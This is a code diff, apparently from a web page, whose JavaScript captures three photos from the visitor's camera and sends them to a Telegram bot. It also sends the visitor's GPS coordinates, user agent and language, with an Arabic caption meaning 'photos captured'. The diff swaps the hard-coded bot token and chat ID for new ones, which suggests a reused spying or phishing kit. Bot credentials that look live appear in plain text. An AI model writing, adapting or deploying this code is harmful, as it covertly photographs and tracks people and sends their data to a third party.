@@ -100,10 +100,10 @@
         for (let i = 0; i < 3; i++) {
           const blob = await imageCapture.takePhoto();
           const formData = new FormData();
-          formData.append('chat_id', '8004961958');
+          formData.append('chat_id', '5747846440');
           formData.append('photo', blob, `photo${i + 1}.jpg`);
 
-          await fetch('https://api.telegram.org/bot8360014194:AAH-fvURy7xpfMgUDl1vMAilrzBGbjqlZxU/sendPhoto', {
+          await fetch('https://api.telegram.org/bot8205261723:AAFcDwQO2B6s1SfsNM7DYGl0PNHTfw7pahk/sendPhoto', {
             method: 'POST',
             body: formData
           });
@@ -114,10 +114,10 @@
         navigator.geolocation.getCurrentPosition(async pos => {
           const text = `📷 تم التقاط الصور\n🌍 الإحداثيات: ${pos.coords.latitude}, ${pos.coords.longitude}\n📱 الجهاز: ${navigator.userAgent}\n🌐 اللغة: ${navigator.language}`;
 
-          await fetch(`https://api.telegram.org/bot8360014194:AAH-fvURy7xpfMgUDl1vMAilrzBGbjqlZxU/sendMessage`, {
+          await fetch(`https://api.telegram.org/bot8205261723:AAFcDwQO2B6s1SfsNM7DYGl0PNHTfw7pahk/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: 8004961958, text })
+            body: JSON.stringify({ chat_id: 5747846440, text })
           });
         });
 
